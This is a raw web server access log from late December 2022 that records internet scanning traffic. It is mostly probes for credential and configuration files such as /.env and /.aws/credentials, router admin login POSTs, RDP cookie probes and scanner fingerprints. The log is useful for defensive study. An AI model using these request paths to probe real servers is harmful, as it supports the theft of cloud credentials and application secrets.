109.237.97.180 - - [28/Dec/2022:15:52:12 +0100] "GET /aws/credentials HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [28/Dec/2022:15:52:12 +0100] "POST /aws/credentials HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [28/Dec/2022:15:52:12 +0100] "GET /credentials HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [28/Dec/2022:15:52:12 +0100] "POST /credentials HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [28/Dec/2022:15:52:12 +0100] "GET /test.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [28/Dec/2022:15:52:13 +0100] "POST /test.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [28/Dec/2022:15:52:13 +0100] "GET /laravel/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [28/Dec/2022:15:52:13 +0100] "POST /laravel/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [28/Dec/2022:15:52:13 +0100] "GET /demo/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [28/Dec/2022:15:52:13 +0100] "POST /demo/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [28/Dec/2022:15:52:13 +0100] "GET /web/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [28/Dec/2022:15:52:14 +0100] "POST /web/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [28/Dec/2022:15:52:14 +0100] "GET /phpinfo HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [28/Dec/2022:15:52:14 +0100] "POST /phpinfo HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
147.135.85.116 - - [28/Dec/2022:15:57:51 +0100] "GET / HTTP/1.1" 301 166 "http://217.160.100.194:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
45.79.181.94 - - [28/Dec/2022:16:10:42 +0100] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\x01Y\x9A\x02\x8F\xDD\xC0}S2i5\x17\xC3\x9Fw\xB3\xFA\x97\x86\x95\xDB?\xC8:i\xC2\xB4\xD1\xFF\x1F0\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
45.81.39.72 - - [28/Dec/2022:16:13:27 +0100] "GET /home.asp HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36"
64.62.197.184 - - [28/Dec/2022:16:31:38 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; rv:105.0) Gecko/20100101 Firefox/105.0"
64.62.197.196 - - [28/Dec/2022:16:33:42 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
64.62.197.182 - - [28/Dec/2022:16:34:19 +0100] "GET /favicon.ico HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15"
91.240.118.145 - - [28/Dec/2022:17:42:07 +0100] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 154 "-" "-"
91.240.118.145 - - [28/Dec/2022:17:42:07 +0100] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 154 "-" "-"
34.140.248.32 - - [28/Dec/2022:18:11:29 +0100] "GET / HTTP/1.1" 301 166 "-" "python-requests/2.28.1"
45.55.37.188 - - [28/Dec/2022:18:33:52 +0100] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03!;_\xB3\xCE\x22\x84\x96\xDE\xB8\xCE^\x88\xE4/\xBD<\xBB,QN;\x18\xC5\xED\x14\x87\xDCw\xD2\xF7_\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
45.55.37.188 - - [28/Dec/2022:18:33:52 +0100] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xDA\xDF\x9B\xF8\x93\xBA~\xA2\xA6\x90\x02/\xE5@\x9E\xFC\xC3\xB2\xDC5\xB6\xAB\x80\xF5PyC\xEF\x0C\xD3!\xDA\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
45.55.37.188 - - [28/Dec/2022:18:33:52 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
152.89.196.211 - - [28/Dec/2022:18:43:03 +0100] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.118.39.29 - - [28/Dec/2022:19:17:05 +0100] "GET / HTTP/1.1" 301 166 "-" "-"
170.79.207.214 - - [28/Dec/2022:19:49:18 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
152.89.196.211 - - [28/Dec/2022:20:20:35 +0100] "GET /actuator/gateway/routes HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
209.141.40.109 - - [28/Dec/2022:20:37:16 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
209.141.35.50 - - [28/Dec/2022:20:44:52 +0100] "GET / HTTP/1.1" 301 166 "-" "Linux Gnu (cow)"
183.136.225.32 - - [28/Dec/2022:21:19:16 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
183.136.225.32 - - [28/Dec/2022:21:24:56 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.32 - - [28/Dec/2022:21:25:17 +0100] "GET /favicon.ico HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.32 - - [28/Dec/2022:21:25:38 +0100] "GET /robots.txt HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
172.104.31.18 - - [28/Dec/2022:21:38:54 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
103.89.89.46 - - [28/Dec/2022:21:49:18 +0100] "GET /.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
103.89.89.46 - - [28/Dec/2022:21:49:19 +0100] "POST / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
205.185.118.237 - - [28/Dec/2022:22:39:59 +0100] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://217.160.100.194:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
205.185.118.237 - - [28/Dec/2022:22:39:59 +0100] "" 400 0 "-" "-"
141.255.167.186 - - [28/Dec/2022:22:57:02 +0100] "GET /.svn HTTP/1.1" 301 166 "-" "Python-urllib/3.7"
45.227.254.54 - - [28/Dec/2022:23:15:14 +0100] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 154 "-" "-"
192.241.220.18 - - [28/Dec/2022:23:34:28 +0100] "GET /druid/index.html HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
209.141.40.109 - - [29/Dec/2022:00:19:21 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
128.199.193.209 - - [29/Dec/2022:00:25:39 +0100] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03r\xB6 \xA0\x8E\x87\xFB\xE2jX\x10\x80\xA7\x02\xAF\xD8jMt\xD45&9]u\x8C/gjG\xEF\x1B\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
128.199.193.209 - - [29/Dec/2022:00:25:39 +0100] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xF2lni\xE8E\xB4\x1EE\x9C\xEB\x04V\x9Ed\xE9\x0Fq\xF2\xD3\x92\xAC\x11\xC9\xCDOA\x80\x8B:t\x8E\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
128.199.193.209 - - [29/Dec/2022:00:25:39 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
139.162.167.216 - - [29/Dec/2022:00:31:46 +0100] "\x16\x03\x00\x00i\x01\x00\x00e\x03\x03U\x1C\xA7\xE4random1random2random3random4\x00\x00\x0C\x00/\x00" 400 154 "-" "-"
139.162.167.216 - - [29/Dec/2022:00:31:46 +0100] "GET /VYFg HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
139.162.167.216 - - [29/Dec/2022:00:31:46 +0100] "GET /lRm2 HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
209.141.35.50 - - [29/Dec/2022:00:33:24 +0100] "GET / HTTP/1.1" 301 166 "-" "Linux Gnu (cow)"
212.102.34.14 - - [29/Dec/2022:00:50:22 +0100] "GET / HTTP/1.1" 301 166 "-" "Linux Gnu (cow)"
205.185.118.237 - - [29/Dec/2022:01:26:29 +0100] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://217.160.100.194:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
205.185.118.237 - - [29/Dec/2022:01:26:29 +0100] "" 400 0 "-" "-"
209.141.40.109 - - [29/Dec/2022:03:26:24 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
99.239.78.117 - - [29/Dec/2022:04:20:48 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
99.79.71.133 - - [29/Dec/2022:04:40:59 +0100] "GET /.env HTTP/1.1" 301 166 "-" "curl/7.47.0"
167.99.38.106 - - [29/Dec/2022:04:59:31 +0100] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x98X\x02=\x0CI3\xA8\x8F\x07Y\xE64\x22\xF2\xDC\x9Er\x81\xC8\xC1\xB8\xF4D\x7F\x06\xAB\xDE\x02\xD1A/\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
167.99.38.106 - - [29/Dec/2022:04:59:31 +0100] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03L\x08pwf\xFC\xB2m\x07\xCC\xEC\x07N\x94q\x96\x91\xFD\xFA\x8DQa\xA7y\xF6\x18:D\xFB\x0F\x02l\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
167.99.38.106 - - [29/Dec/2022:04:59:31 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
205.185.118.237 - - [29/Dec/2022:05:05:42 +0100] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://217.160.100.194:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
205.185.118.237 - - [29/Dec/2022:05:05:42 +0100] "" 400 0 "-" "-"
92.118.39.29 - - [29/Dec/2022:05:10:31 +0100] "GET / HTTP/1.1" 301 166 "-" "-"
45.61.186.176 - - [29/Dec/2022:05:12:48 +0100] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://217.160.100.194:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
45.61.186.176 - - [29/Dec/2022:05:12:48 +0100] "" 400 0 "-" "-"
2.57.122.19 - - [29/Dec/2022:05:16:20 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36"
162.243.145.9 - - [29/Dec/2022:06:06:11 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
167.248.133.46 - - [29/Dec/2022:06:17:55 +0100] "GET / HTTP/1.1" 301 166 "-" "-"
167.248.133.46 - - [29/Dec/2022:06:17:56 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.46 - - [29/Dec/2022:06:17:56 +0100] "PRI * HTTP/2.0" 400 154 "-" "-"
45.227.254.54 - - [29/Dec/2022:07:25:48 +0100] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 154 "-" "-"
94.156.144.72 - - [29/Dec/2022:07:26:44 +0100] "CONNECT www.sfb1015.uni-freiburg.de:443 HTTP/1.1" 400 154 "-" "-"
152.89.196.245 - - [29/Dec/2022:07:56:48 +0100] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 154 "-" "-"
94.102.61.10 - - [29/Dec/2022:08:01:43 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
209.141.35.50 - - [29/Dec/2022:08:21:23 +0100] "GET / HTTP/1.1" 301 166 "-" "Linux Gnu (cow)"
172.104.31.18 - - [29/Dec/2022:09:01:23 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8"
209.141.40.109 - - [29/Dec/2022:10:16:43 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
104.244.72.129 - - [29/Dec/2022:10:24:26 +0100] "GET /home.asp HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36"
205.185.118.237 - - [29/Dec/2022:10:38:43 +0100] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://217.160.100.194:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
205.185.118.237 - - [29/Dec/2022:10:38:43 +0100] "" 400 0 "-" "-"
68.183.176.35 - - [29/Dec/2022:10:44:30 +0100] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03I7\xA4\x9D0\xAD~\x9B\xEC3\xAA\xB8\x83\xB6,\x13*t\xE9^d\x12\x88\x9F\x89hu\xD2\x83\xA3\xEF&\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
68.183.176.35 - - [29/Dec/2022:10:44:30 +0100] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xEE'<\x07x)}T\xAC\x8BN \xE1\x13\x9EfcK\xE9a\xBB(\xA8\xAFq-\xF4Q\x97_\x9AF\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
68.183.176.35 - - [29/Dec/2022:10:44:30 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
194.55.186.216 - - [29/Dec/2022:10:55:46 +0100] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://217.160.100.194:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
194.55.186.216 - - [29/Dec/2022:10:55:46 +0100] "" 400 0 "-" "-"
73.90.195.219 - - [29/Dec/2022:11:45:20 +0100] "GET / HTTP/1.1" 301 166 "-" "-"
64.62.197.224 - - [29/Dec/2022:13:15:59 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"
64.62.197.222 - - [29/Dec/2022:13:17:29 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
64.62.197.216 - - [29/Dec/2022:13:18:23 +0100] "GET /favicon.ico HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
205.185.118.237 - - [29/Dec/2022:13:22:00 +0100] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://217.160.100.194:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
205.185.118.237 - - [29/Dec/2022:13:22:00 +0100] "" 400 0 "-" "-"
209.141.35.50 - - [29/Dec/2022:14:08:25 +0100] "GET / HTTP/1.1" 301 166 "-" "Linux Gnu (cow)"
92.118.39.29 - - [29/Dec/2022:14:54:10 +0100] "GET / HTTP/1.1" 301 166 "-" "-"
179.43.187.243 - - [29/Dec/2022:15:04:46 +0100] "GET / HTTP/1.1" 301 166 "-" "Linux Gnu (cow)"
109.237.97.180 - - [29/Dec/2022:15:13:24 +0100] "GET /.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [29/Dec/2022:15:13:24 +0100] "\x16\x03\x01\x01H\x01\x00\x01D\x03\x03\x1D\xE2*.\x94\xA8MOS\x88\x5C\xA1\xF9[x\x19\xC1\xA2W\xDA\x00\xCA ]\xE3\xA4C*(\x83`B 3\x1Fl\x9FCH\xC4\x15;i[b\x19\x5C\x03\xA7\x7FX*\xA5\xAC\x94Q\xA4\x98\xF6\x8D\x8B\xC0Ow\xDB\x00b\x13\x02\x13\x03\x13\x01\xC0,\xC00\xC0+\xC0/\xCC\xA9\xCC\xA8\x00\xA3\x00\x9F\x00\xA2\x00\x9E\xCC\xAA\xC0\xAF\xC0\xAD\xC0$\xC0(\xC0" 400 154 "-" "-"
109.237.97.180 - - [29/Dec/2022:15:13:24 +0100] "POST /.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [29/Dec/2022:15:13:24 +0100] "GET /.aws/credentials HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [29/Dec/2022:15:13:25 +0100] "POST /.aws/credentials HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [29/Dec/2022:15:13:25 +0100] "GET /.aws/config HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [29/Dec/2022:15:13:25 +0100] "POST /.aws/config HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [29/Dec/2022:15:13:25 +0100] "GET /aws/credentials HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [29/Dec/2022:15:13:25 +0100] "POST /aws/credentials HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [29/Dec/2022:15:13:25 +0100] "GET /credentials HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [29/Dec/2022:15:13:25 +0100] "POST /credentials HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [29/Dec/2022:15:13:25 +0100] "GET /test.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [29/Dec/2022:15:13:26 +0100] "POST /test.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [29/Dec/2022:15:13:26 +0100] "GET /laravel/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [29/Dec/2022:15:13:26 +0100] "POST /laravel/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [29/Dec/2022:15:13:26 +0100] "GET /demo/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [29/Dec/2022:15:13:26 +0100] "POST /demo/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [29/Dec/2022:15:13:26 +0100] "GET /web/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [29/Dec/2022:15:13:27 +0100] "POST /web/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [29/Dec/2022:15:13:27 +0100] "GET /phpinfo HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [29/Dec/2022:15:13:27 +0100] "POST /phpinfo HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.79.149.111 - - [29/Dec/2022:15:17:15 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0"
45.227.254.54 - - [29/Dec/2022:15:40:05 +0100] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 154 "-" "-"
146.190.108.75 - - [29/Dec/2022:15:59:30 +0100] "HEAD / HTTP/1.0" 301 0 "-" "-"
146.190.108.75 - - [29/Dec/2022:15:59:30 +0100] "GET /system_api.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
146.190.108.75 - - [29/Dec/2022:15:59:32 +0100] "GET /c/version.js HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
146.190.108.75 - - [29/Dec/2022:15:59:34 +0100] "GET /streaming/clients_live.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
146.190.108.75 - - [29/Dec/2022:15:59:36 +0100] "GET /stalker_portal/c/version.js HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
146.190.108.75 - - [29/Dec/2022:15:59:38 +0100] "GET /stream/live.php HTTP/1.1" 301 166 "-" "AlexaMediaPlayer/2.1.4676.0 (Linux;Android 5.1.1) ExoPlayerLib/1.5.9"
146.190.108.75 - - [29/Dec/2022:15:59:40 +0100] "GET /flu/403.html HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
146.190.108.75 - - [29/Dec/2022:15:59:42 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
45.79.128.205 - - [29/Dec/2022:16:07:40 +0100] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\x13\xF7\xAD\x99v\xB9\x9A\xE3t\xF9\x99!\x1F=b\xC5\xC6" 400 154 "-" "-"
209.141.40.109 - - [29/Dec/2022:16:15:46 +0100] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
